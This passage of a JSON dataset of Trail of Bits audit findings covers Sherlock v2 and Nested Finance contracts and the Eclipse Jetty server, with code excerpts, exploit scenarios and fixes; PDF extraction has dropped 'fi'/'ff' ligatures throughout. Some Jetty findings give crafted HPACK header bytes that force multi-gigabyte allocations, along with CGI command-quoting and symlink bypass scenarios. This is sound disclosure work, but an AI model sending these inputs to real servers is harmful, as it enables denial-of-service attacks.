the SHER maxRewardsRate has 18 decimals and updates the calculation incorrectly. As a result, the newly calculated reward is incorrect. Recommendations Short term, use an 18-decimal value for maxRewardsRate and divide by DECIMALS instead of multiplying. Long term, when implementing calculations that use the rate of a given token, strive to use a rate variable with the same number of decimals as the token. This will prevent any confusion with regard to decimals, which might lead to introducing precision bugs when updating the contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. A claim cannot be paid out or escalated if the protocol agent changes after the claim has been initialized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "The escalate and payoutClaim functions can be called only by the protocol agent that started the claim. Therefore, if the protocol agent role is reassigned after a claim is started, the new protocol agent will be unable to call these functions and complete the claim. function escalate(uint256 _claimID, uint256 _amount) external override nonReentrant whenNotPaused 388 389 390 391 392 393 { 394 395 396 397 398 399 400 401 402 403 if (_amount < BOND) revert InvalidArgument(); // Gets the internal ID of the claim bytes32 claimIdentifier = publicToInternalID[_claimID]; if (claimIdentifier == bytes32(0)) revert InvalidArgument(); // Retrieves the claim struct Claim storage claim = claims_[claimIdentifier]; // Requires the caller to be the protocol agent if (msg.sender != claim.initiator) revert InvalidSender(); Figure 6.1: contracts/managers/SherlockClaimManager.sol:388-403 Due to this scheme, care should be taken when updating the protocol agent. That is, the protocol agent should not be reassigned if there is an existing claim. However, if the protocol agent is changed when there is an existing claim, the protocol agent role could be transferred back to the original protocol agent to complete the claim. Exploit Scenario Alice is the protocol agent and starts a claim. Alice transfers the protocol agent role to Bob. The claim is approved by SPCC and can be paid out. Bob calls payoutClaim, but the transaction reverts. Recommendations Short term, update the comment in the escalate and payoutClaim functions to state that the caller needs to be the protocol agent that started the claim, and clearly describe this requirement in the protocol agent documentation. Alternatively, update the check to verify that msg.sender is the current protocol agent rather than specically the protocol agent who initiated the claim. Long term, review and document the eects of the reassignment of privileged roles on the systems state transitions. Such a review will help uncover cases in which the reassignment of privileged roles causes issues and possibly a denial of service to (part of) the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Missing input validation in setMinActiveBalance could cause a confusing event to be emitted ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "The setMinActiveBalance functions input validation is incomplete: it should check that the minActiveBalance has not been set to its existing value, but this check is missing. Additionally, if the minActiveBalance is set to its existing value, the emitted MinBalance event will indicate that the old and new values are identical. This could confuse systems monitoring the contract that expect this event to be emitted only when the minActiveBalance changes. function setMinActiveBalance(uint256 _minActiveBalance) external override onlyOwner { // Can't set a value that is too high to be reasonable require(_minActiveBalance < MIN_BALANCE_SANITY_CEILING, 'INSANE'); emit MinBalance(minActiveBalance, _minActiveBalance); minActiveBalance = _minActiveBalance; 422 423 424 425 426 427 428 } Figure 7.1: contracts/managers/SherlockProtocolManager.sol:422-428 Exploit Scenario An o-chain monitoring system controlled by the Sherlock protocol is listening for events that indicate that a contract conguration value has changed. When such events are detected, the monitoring system sends an email to the admins of the Sherlock protocol. Alice, a contract owner, calls setMinActiveBalance with the existing minActiveBalance as input. The o-chain monitoring system detects the emitted event and noties the Sherlock protocol admins. The Sherlock protocol admins are confused since the value did not change. Recommendations Short term, add input validation that causes setMinActiveBalance to revert if the proposed minActiveBalance value equals the current value. Long term, document and test the expected behavior of all the systems events. Consider using a blockchain-monitoring system to track any suspicious behavior in the contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. payoutClaims calling of external contracts in a loop could cause a denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "The payoutClaim function uses a loop to call the PreCorePayoutCallback function on a list of external contracts. If any of these calls reverts, the entire payoutClaim function reverts, and, hence, the transaction reverts. This may not be the desired behavior; if that is the case, a denial of service would prevent claims from being paid out. for (uint256 i; i < claimCallbacks.length; i++) { claimCallbacks[i].PreCorePayoutCallback(protocol, _claimID, amount); 499 500 501 } Figure 8.1: contracts/managers/SherlockClaimManager.sol:499-501 The owner of the SherlockClaimManager contract controls the list of contracts on which the PreCorePayoutCallback function is called. The owner can add or remove contracts from this list at any time. Therefore, if a contract is causing unexpected reverts, the owner can x the problem by (temporarily) removing that contract from the list. It might be expected that some of these calls revert and cause the entire transaction to revert. However, the external contracts that will be called and the expected behavior in the event of a revert are currently unknown. If a revert should not cause the entire transaction to revert, the current implementation does not fulll that requirement. To accommodate both casesa revert of an external call reverts the entire transaction or allows the transaction to continue a middle road can be taken. For each contract in the list, a boolean could indicate whether the transaction should revert or continue if the external call fails. If the boolean indicates that the transaction should continue, an emitted event would indicate the contract address and the input arguments of the callback that reverted. This would allow the system to continue functioning while admins investigate the cause of the revert and x the issue(s) if needed. Exploit Scenario Alice, the owner of the SherlockClaimManager contract, registers contract A in the list of contracts on which PreCorePayoutCallback is called. Contract A contains a bug that causes the callback to revert every time. Bob, a protocol agent, successfully les a claim and calls payoutClaim. The transaction reverts because the call to contract A reverts. Recommendations Short term, review the requirements of contracts that will be called by callback functions, and adjust the implementation to fulll those requirements. Long term, when designing a system reliant on external components that have not yet been determined, carefully consider whether to include those integrations during the development process or to wait until those components have been identied. This will prevent unforeseen problems due to incomplete or incorrect integrations with unknown contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. pullReward could silently fail and cause stakers to lose all earned SHER rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "If the SherDistributionManager.pullReward function reverts, the calling function (_stake) will not set the SHER rewards in the stakers position NFT. As a result, the staker will not receive the payout of SHER rewards after the stake period has passed. // Sets the timestamp at which this position can first be unstaked/restaked lockupEnd_[_id] = block.timestamp + _period; if (address(sherDistributionManager) == address(0)) return 0; // Does not allow restaking of 0 tokens if (_amount == 0) return 0; // Checks this amount of SHER tokens in this contract before we transfer new ones uint256 before = sher.balanceOf(address(this)); // pullReward() calcs then actually transfers the SHER tokens to this contract try sherDistributionManager.pullReward(_amount, _period, _id, _receiver) returns ( function _stake( uint256 _amount, uint256 _period, uint256 _id, address _receiver 354 355 356 357 358 359 ) internal returns (uint256 _sher) { 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 } catch (bytes memory reason) { _sher = amount; uint256 amount ) { } // If for whatever reason the sherDistributionManager call fails emit SherRewardsError(reason); return 0; // actualAmount should represent the amount of SHER tokens transferred to this contract for the current stake position 382 383 384 385 386 } uint256 actualAmount = sher.balanceOf(address(this)) - before; if (actualAmount != _sher) revert InvalidSherAmount(_sher, actualAmount); // Assigns the newly created SHER tokens to the current stake position sherRewards_[_id] = _sher; Figure 9.1: contracts/Sherlock.sol:354-386 When the pullReward call reverts, the SherRewardsError event is emitted. The staker could check this event and see that no SHER rewards were set. The staker could also call the sherRewards function and provide the positions NFT ID to check whether the SHER rewards were set. However, stakers should not be expected to make these checks after every (re)stake. There are two ways in which the pullReward function can fail. First, a bug in the arithmetic could cause an overow and revert the function. Second, if the SherDistributionManager contract does not hold enough SHER to be able to transfer the calculated amount, the pullReward function will fail. The SHER balance of the contract needs to be manually topped up. If a staker detects that no SHER was set for her (re)stake, she may want to cancel the stake. However, stakers are not able to cancel a stake until the stakes period has passed (currently, at least three months). Exploit Scenario Alice creates a new stake, but the SherDistributionManager contract does not hold enough SHER to transfer the rewards, and the transaction reverts. The execution continues and sets Alices stake allocation to zero. Recommendations Short term, have the system revert transactions if pullReward reverts. Long term, have the system revert transactions if part of the expected rewards are not allocated due to an internal revert. This will prevent situations in which certain users get rewards while others do not.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Trusted forwarder can take over the WalletFactory contract ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf",
        "body": "The WalletFactory contract implements ERC-2771, which enables the use of a trusted forwarder to create wallets on behalf of other accounts. With the introduction of PR #110, the contract is also upgradeable. Therefore, the trusted forwarder contract can call the upgrade function on the WalletFactory contract by submitting the owner address as the value of msg.sender. PR #110 adds an override of the _msgSender function to the WalletFactory contract, which now uses the ERC-2771 context contract; this function allows the trusted forwarder to set any value for the message sender: /// @dev Provides information about the current execution context /// /// function _msgSender() WalletFactory is inheriting from ERC2771Context and Context through Ownable2Step. It is needed to override to specify which base to use internal view virtual override(ERC2771Context, Context) returns (address) return ERC2771Context._msgSender(); { } Figure 1.1: WalletFactory.sol#L306-L317 The onlyOwner modier relies on _msgSender: /** * @dev Throws if called by any account other than the owner. */ modifier onlyOwner() { _checkOwner(); _; } [] /** * @dev Throws if the sender is not the owner. */ function _checkOwner() internal view virtual { require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); } Figure 1.2: OZ/access/Ownable.sol#L42-L64 Among others, onlyOwner is used as an access control of the upgrade function: function _authorizeUpgrade(address newImplementation) internal virtual override onlyOwner { if (newImplementation.code.length == 0) { revert AddressNotContract(newImplementation); } } Figure 1.3: OZ/access/Ownable.sol#L50-L52 As a result, the trusted forwarder can control all of the owner-specic operations, including the following:  Upgrading the contract  Changing the contracts owner Appendix B contains a test case to trigger this issue. Exploit Scenario Bob is a trusted forwarder. Therefore, he expects that his account has only additional rights regarding the creation of new wallets, so he does not properly protect his access. Eve manages to compromise Bobs account and gains access to ownership of the wallet factory. Eve uses her new access to upgrade the wallet factory to a malicious contract that generates malicious wallets. Alice unknowingly generates a new malicious wallet and puts $10 million worth of assets into it. Eve steals the assets. Recommendations Short term, prevent the trusted forwarder from having access to owner privileges except where this behavior is expected and documented. Long term, document and test the access controls of the wallet factory; ensure that the documentation highlights the access control expectations for the trusted forwarder.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Lack of contract existence check on StaticHyVM ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf",
        "body": "The call to delegatecall made in the StaticHyVM contract does not check that the hyvm contract has code; this call will succeed even if the hyvm contract was destroyed. The doDelegateCall function uses a low-level call to delegatecall to call hyvm: function doDelegateCall(bytes calldata payload) public returns (bytes memory) { if (msg.sender != address(this)) revert OnlySelf(); (bool success, bytes memory data) = hyvm.delegatecall(payload); if (!success) _bubbleError(data, \"StaticHyVM: delegatecall failed\"); return data; } Figure 2.1: StaticHyVM/StaticHyVM.sol#L30-L36 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 2.2: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall As a result, any call made to a nonexistent contract will return success, even if no code was executed. We acknowledge that the likelihood that the hyvm contract will be destroyed is low; however, the previous audit that we conducted on the Nested Finance codebases determined that this risk is not null. (Refer to nding TOB-NESTED-1 of the previous report.) Exploit Scenario Bob creates a bot that takes actions following the execution of StaticHyVM. A bug is found in hyvm, and the contract is destroyed. However, all of the calls made to StaticHyVM continue to return success, leading Bobs bot to take incorrect actions. Recommendations Short term, implement a contract existence check before the call to delegatecall in StaticHyVM. Long term, carefully review the Solidity documentation, especially the Warnings section. Document every assumption made for code optimizations, and ensure that the underlying invariants hold. For example, if an invariant states that all of the contracts that are used exist, extra care must be taken to ensure that all calls destinations always have code.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Address aliasing on optimistic rollups is not considered ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf",
        "body": "The documentation states that the users wallet address will be the same across dierent chains, but this does not take into account the address aliasing that some chains apply to sender addresses. PR #119 changes the logic of the wallet creation process such that a wallet originating from a specic user will be the same across EVM-compatible chains: Allows to share the same address on dierent EVM equivalent chains. It should prevent cross chain manipulation. If a USER1 creates a wallet or USER2 creates on behalf of USER1, the address of the wallet will be the same and will depend on the USER1 address. Hence, on dierent chains, if EVM equivalent, the address of a wallet for a specic user will be the same. Figure 3.1: Documentation included with PR #119 However, some chainsparticularly optimistic rollupsapply aliasing on the L1 callers address if it is a contract. (Refer to Arbitrums documentation.) In these situations, the address specied for the L2 caller will not be the same as the L1 address. As a result, the assumption that users can keep the same address across chains will not hold for such chains. Recommendations Short term, update the documentation to inform users that their wallet addresses may be aliased on some chains. Long term, create tests targeting every EVM-compatible chain that the system is meant to support. References  Address aliasing in Arbitrum  Address aliasing in Optimism",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Undocumented expectations for state-changing operations in HyVM ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf",
        "body": "PR #1 removed some of the state-changing operations from the HyVM contract, but not all of them. It is unclear whether the Nested Finance team intended to keep those remaining operations in the contract. In particular, the following state-changing operations are still allowed:  Operations that emit events (such as log0 and log1)  Operations that are called with nonzero values Recommendations Short term, update the documentation to make it clear whether these operations should be allowed. Disable any that should not be allowed. Long term, maintain an up-to-date design specication to dene the behavior of the HyVM, including the operations that are available and the state changes that are allowed, if any. This specication should be a living document that changes as the protocol changes.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Invalid EVM versions possible in multi-chain deployment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf",
        "body": "The HyVM and Tetris contracts contain Solidity pragmas that constrain the compilers version to 0.8.16 or above. However, if these contracts were to be compiled with Solidity 0.8.20 and deployed to a chain that has not implemented EIP-3855, the contracts would fail to deploy because Solidity 0.8.20 would default to the Shanghai EVM version. The Shanghai hard fork introduced a new opcode, PUSH0. Solidity 0.8.20 adds support for Shanghai, and contracts compiled with Solidity 0.8.20 will include PUSH0 instructions by default. Given that most non-Ethereum chains have not added support for PUSH0 yet, contracts compiled with Solidity 0.8.20 will fail to deploy on those chains unless the EVM version is explicitly set. Recommendations Short term, add documentation to ensure that the code is built with an EVM version that is supported by the target chain. Long term, add tests that cover all of the EVM-compatible chains that should be supported by the contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. executeCall will always revert when sending native tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-nestedfinance-tetrishyvm-securityreview.pdf",
        "body": "executeCall and executeMultiCall are both payable functions that accept a Call struct as an argument. These functions use OpenZeppelin's Address.functionCallWithValue function to make an arbitrary call to the target address, with payload passed as the calldata and the value to be sent equal to call.value. function executeCall(Call calldata call) public payable override onlyWalletOwner returns (bytes memory data) { } _wrapNativeToken(); return Address.functionCallWithValue(call.target, call.payload, call.value); Figure 6.1: NestedWallet.sol#L141-L150 In both functions, before Address.functionCallWithValue is invoked, the _wrapNativeToken function is called, which deposits msg.value worth of native tokens into the WETH contract, turning any ETH that was sent with the transaction into WETH. Therefore, by the time the call to Address.functionCallWithValue is made, the wallet no longer has the native tokens that were sent along with the call. So when Address.functionCallWithValue performs its low-level call, the transaction reverts with the error Address: insufficient balance for call. Exploit Scenario Bob calls executeCall to send 10 ether. The call fails, and Bob is unable to use the Nested wallet as he expected to. Recommendations Short term, remove the _wrapNativeToken(); line from both functions. Additionally, we noted that _wrapNativeToken is called in executeHyVMCall and executeSignature712, but it does not introduce a risk because it is called before a delegatecall and the value is not passed along in the same way. However, if this is the desired behavior, then it should be documented. Long term, include unit and fuzz tests for sending native tokens when testing payable functions. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Risk of integer overow that could allow HpackDecoder to exceed maxHeaderSize ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "An integer overow could occur in the MetaDataBuilder.checkSize function, which would allow HPACK header values to exceed their size limit. MetaDataBuilder.checkSize determines whether a header name or value exceeds the size limit and throws an exception if the limit is exceeded: public void checkSize ( int length, boolean huffman) throws SessionException { 291 292 293 294 295 296 297 _size + length, _maxSize); 298 } // Apply a huffman fudge factor if (huffman) length = (length * 4 ) / 3 ; if ((_size + length) > _maxSize) throw new HpackException.SessionException( \"Header too large %d > %d\" , Figure 1.1: MetaDataBuilder.checkSize However, when the value of length is very large and huffman is true , the multiplication of length by 4 in line 295 will overow, and length will become negative. This will cause the result of the sum of _size and length to be negative, and the check on line 296 will not be triggered. Exploit Scenario An attacker repeatedly sends HTTP messages with the HPACK header 0x00ffffffffff02 . Each time this header is decoded, the following occurs:  HpackDecode.decode determines that a Human-coded value of length 805306494 needs to be decoded. 36 OSTIF Eclipse: Jetty Security Assessment  MetaDataBuilder.checkSize approves this length.  Huffman.decode allocates a 1.6 GB string array.  Huffman.decode experiences a buer overow error, and the array is deallocated the next time garbage collection happens. (Note that this deallocation can be delayed by appending valid Human-coded characters to the end of the header.) Depending on the timing of garbage collection, the number of threads, and the amount of memory available on the server, this may cause the server to run out of memory. Recommendations Short term, have MetaDataBuilder.checkSize check that length is below a threshold before performing the multiplication. Long term, use fuzzing to check for similar errors; we found this issue by fuzzing HpackDecode . 37 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Cookie parser accepts unmatched quotation marks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The RFC6265CookieParser.parseField function does not check for unmatched quotation marks. For example, parseField(\\) will execute without raising an exception. This issue is unlikely to lead to any vulnerabilities, but it could lead to problems if users or developers expect the function to accept only valid strings. Recommendations Short term, modify the function to check that the state at the end of the given string is not IN_QUOTED_VALUE . Long term, when using a state machine, ensure that the code always checks that the state is valid before exiting. 38 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Errant command quoting in CGI servlet ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "If a user sends a request to a CGI servlet for a binary with a space in its name, the servlet will escape the command by wrapping it in quotation marks. This wrapped command, plus an optional command prex, will then be executed through a call to Runtime.exec . If the original binary name provided by the user contains a quotation mark followed by a space, the resulting command line will contain multiple tokens instead of one. For example, if a request references a binary called file name here , the escaping algorithm will generate the command line string file name here , which will invoke the binary named file , not the one that the user requested. if (execCmd.length() > 0 && execCmd.charAt( 0 ) != '\"' && execCmd.contains( \" \" )) execCmd = \"\\\"\" + execCmd + \"\\\"\" ; Figure 3.1: CGI.java#L337L338 Exploit Scenario The cgi-bin directory contains a binary named exec and a subdirectory named exec commands , which contains a le called bin1 . A user sends to the CGI servlet a request for the lename exec commands/bin1 . This request passes the le existence check on lines 194 through 205 in CGI.java . The servlet adds quotation marks around this lename, resulting in the command line string exec commands/bin1 . When this string is passed to Runtime.exec , instead of executing the bin1 binary, the server executes the exec binary with the argument commands/bin1 . This behavior is incorrect and could bypass alias checks; it could also cause other unintended behaviors if a command prex is congured. Additionally, if the useFullPath conguration setting is o, the command would not need to pass the existence check. Without this setting, an attacker exploiting this issue would not have to rely on a binary and subdirectory with similar names, and the attack could succeed on a much wider variety of directory structures. 39 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, update line 346 in CGI.java to replace the call to exec(String command, String[] env, File dir) with a call to exec(String[] cmdarray, String[] env, File dir) so that the quotation mark escaping algorithm does not create new tokens in the command line string. Long term, update the quotation mark escaping algorithm so that any unescaped quotation marks in the original name of the command are properly escaped, resulting in one double-quoted token instead of multiple adjacent quoted strings. Additionally, the expression execCmd.charAt(0) != '\"' on line 337 of CGI.java is intended to avoid adding additional quotation marks to an already-quoted command string. If this check is unnecessary, it should be removed. If it is necessary, it should be replaced by a more robust check that accurately detects properly formatted double-quoted strings. 40 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Symlink-allowed alias checker ignores protected targets list ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The class SymlinkAllowedResourceAliasChecker is an alias checker that permits users to access a symlink as long as the symlink is stored within an allowed directory. The following comment appears on line 76 of this class: // TODO: return !getContextHandler().isProtectedTarget(realURI.toString()); Figure 4.1: SymlinkAllowedResourceAliasChecker.java#L76 As this comment suggests, the alias checker does not yet enforce the context handlers protected resource list. That is, if a symlink is contained in an allowed directory but points to a target on the protected resource list, the alias checker will return a positive match. During our review, we found that some other modules, but not all, independently enforce the protected resource list and will decline to serve resources on the list even if the alias checker returns a positive result. But the modules that do not independently enforce the protected resource list could serve protected resources to attackers conducting symlink attacks. Exploit Scenario An attacker induces the creation of a symlink (or a system administrator accidentally creates one) in a web-accessible directory that points to a protected resource (e.g., a child of WEB-INF ). By requesting this symlink through a servlet that uses the SymlinkAllowedResourceAliasChecker class, the attacker bypasses the protected resource list and accesses the sensitive les. Recommendations Short term, implement the check referenced in the comment so that the alias checker rejects symlinks that point to a protected resource or a child of a protected resource. Long term, consider clarifying and documenting the responsibilities of dierent components for enforcing protected resource lists. Consider implementing redundant checks in multiple modules for purposes of layered security. 41 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Missing check for malformed Unicode escape sequences in QuotedStringTokenizer.unquote ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The QuotedStringTokenizer classs unquote method parses \\u#### Unicode escape sequences, but it does not rst check that the escape sequence is properly formatted or that the string is of a sucient length: case 'u' : b.append(( char )( (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 24 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 16 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++)) << 8 ) + (TypeUtil.convertHexDigit(( byte )s.charAt(i++))) ) ); break ; Figure 5.1: QuotedStringTokenizer.java#L547L555 Any calls to this function with an argument ending in an incomplete Unicode escape sequence, such as str\\u0 , will cause the code to throw a java.lang.NumberFormatException exception. The only known execution path that will cause this method to be called with a parameter ending in an invalid Unicode escape sequence is to induce the processing of an ETag Matches header by the ResourceService class, which calls EtagUtils.matches , which calls QuotedStringTokenizer.unquote . Exploit Scenario An attacker introduces a maliciously crafted ETag into a browsers cache. Each subsequent request for the aected resource causes a server-side exception, preventing the server from producing a valid response so long as the cached ETag remains in place. Recommendations Short term, add a try-catch block around the aected code that drops malformed escape sequences. 42 OSTIF Eclipse: Jetty Security Assessment Long term, implement a suitable workaround for lenient mode that passes the raw bytes of the malformed escape sequence into the output. 43 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. WebSocket frame length represented with 32-bit integer ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The WebSocket standard (RFC 6455) allows for frames with a size of up to 2 64 bytes. However, the WebSocket parser represents the frame length with a 32-bit integer: private int payloadLength; // ...[snip]... case PAYLOAD_LEN_BYTES: { } byte b = buffer.get(); --cursor; payloadLength |= (b & 0xFF ) << ( 8 * cursor); // ...[snip]... Figure 6.1: Parser.java , lines 57 and 147151 As a result, this parsing algorithm will incorrectly parse some length elds as negative integers, causing a java.lang.IllegalArgumentException exception to be thrown when the parser tries to set the limit of a Buffer object to a negative number (refer to TOB-JETTY-7 ). Consequently, Jettys WebSocket implementation cannot properly process frames with certain lengths that are compliant with RFC 6455. Even if no exception results, this logic error will cause the parser to incorrectly identify the sizes of WebSocket frames and the boundaries between them. If the server passes these frames to another WebSocket connection, this bug could enable attacks similar to HTTP request smuggling, resulting in bypasses of security controls. Exploit Scenario A Jetty WebSocket server is deployed in a reverse proxy conguration in which both Jetty and another web server parse the same stream of WebSocket frames. An attacker sends a frame with a length that the Jetty parser incorrectly truncates to a 32-bit integer. Jetty and the other server interpret the frames dierently, which causes errors in the implementation of security controls, such as WAF lters. 44 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, change the payloadLength variable to use the long data type instead of an int . Long term, audit all arithmetic operations performed on this payloadLength variable to ensure that it is always used as an unsigned integer instead of a signed one. The standard librarys Integer class can provide this functionality. 45 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "7. WebSocket parser does not check for negative payload lengths ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The WebSocket parsers checkFrameSize method checks for payload lengths that exceed the current congurations maximum, but it does not check for payload lengths that are lower than zero. If the payload length is lower than zero, the code will throw an exception when the payload length is passed to a call to buffer.limit . Exploit Scenario An attacker sends a WebSocket payload with a length eld that parses to a negative signed integer (refer to TOB-JETTY-6 ). This payload causes an exception to be thrown and possibly the server process to crash. Recommendations Short term, update checkFrameSize to throw an org.eclipse.jetty.websocket.core.exception.ProtocolException exception if the frames length eld is less than zero. 46 OSTIF Eclipse: Jetty Security Assessment 8. WebSocket parser greedily allocates ByteBu\u0000ers for large frames Severity: Medium Diculty: Low Type: Denial of Service Finding ID: TOB-JETTY-8 Target: org.eclipse.jetty.websocket.core.internal.Parser",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Risk of integer overow in HPACK's NBitInteger.decode ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The static function NBitInteger.decode is used to decode bytestrings in HPACK's integer format. It should return only positive integers since HPACKs integer format is not intended to support negative numbers. However, the following loop in NBitInteger.decode is susceptible to integer overows in its multiplication and addition operations: public static int decode (ByteBuffer buffer, int n) { if (n == 8 ) { // ... } int nbits = 0xFF >>> ( 8 - n); int i = buffer.get(buffer.position() - 1 ) & nbits; if (i == nbits) { int m = 1 ; int b; do { b = 0xff & buffer.get(); i = i + (b & 127 ) * m; m = m * 128 ; } while ((b & 128 ) == 128 ); } return i; } Figure 9.1: NBitInteger.java , lines 105145 For example, NBitInteger.decode(0xFF8080FFFF0F, 7) returns -16257 . Any overow that occurs in the function would not be a problem on its own since, in general, the output of this function ought to be validated before it is used; however, when coupled with other issues (refer to TOB-JETTY-10 ), an overow can cause vulnerabilities. 49 OSTIF Eclipse: Jetty Security Assessment Recommendations Short term, modify NBitInteger.decode to check that its result is nonnegative before returning it. Long term, consider merging the QPACK and HPACK implementations for NBitInteger , since they perform the same functionality; the QPACK implementation of NBitInteger checks for overows. 50 OSTIF Eclipse: Jetty Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. MetaDataBuilder.checkSize accepts headers of negative lengths ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-jetty-securityreview.pdf",
        "body": "The MetaDataBuilder.checkSize function accepts user-entered HPACK header values of negative sizes, which could cause a very large buer to be allocated later when the user-entered size is multiplied by 2. MetaDataBuilder.checkSize determines whether a header name or value exceeds the size limit and throws an exception if the limit is exceeded: public void checkSize ( int length, boolean huffman) throws SessionException { // Apply a huffman fudge factor if (huffman) length = (length * 4 ) / 3 ; if ((_size + length) > _maxSize) throw new HpackException.SessionException( \"Header too large %d > %d\" , _size + length, _maxSize); } Figure 10.1: MetaDataBuilder.java , lines 291298 However, it does not throw an exception if the size is negative. Later, the Huffman.decode function multiplies the user-entered length by 2 before allocating a buer: public static String decode (ByteBuffer buffer, int length) throws HpackException.CompressionException { Utf8StringBuilder utf8 = new Utf8StringBuilder(length * 2 ); // ... Figure 10.2: Huffman.java , lines 357359 This means that if a user provides a negative length value (or, more precisely, a length value that becomes negative when multiplied by the 4/3 fudge factor), and this length value becomes a very large positive number when multiplied by 2, then the user can cause a very large buer to be allocated on the server. 51 OSTIF Eclipse: Jetty Security Assessment Exploit Scenario An attacker repeatedly sends HTTP messages with the HPACK header 0x00ff8080ffff0b . Each time this header is decoded, the following occurs:  HpackDecode.decode determines that a Human-coded value of length -1073758081 needs to be decoded.  MetaDataBuilder.checkSize approves this length.  The number is multiplied by 2, resulting in 2147451134 , and Huffman.decode allocates a 2.1 GB string array.  Huffman.decode experiences a buer overow error, and the array is deallocated the next time garbage collection happens. (Note that this deallocation can be delayed by adding valid Human-coded characters to the end of the header.) Depending on the timing of garbage collection, the number of threads, and the amount of memory available on the server, this may cause the server to run out of memory. Recommendations Short term, have MetaDataBuilder.checkSize check that the given length is positive directly before adding it to _size and comparing it with _maxSize . Long term, add checks for integer overows in Huffman.decode and in NBitInteger.decode (refer to TOB-JETTY-9 ) for added redundancy. 52 OSTIF Eclipse: Jetty Security Assessment 11. Insu\u0000cient space allocated when encoding QPACK instructions and entries Severity: Low Diculty: High Type: Denial of Service Finding ID: TOB-JETTY-11 Target:  org.eclipse.jetty.http3.qpack.internal.instruction.IndexedName EntryInstruction  org.eclipse.jetty.http3.qpack.internal.instruction.LiteralName EntryInstruction  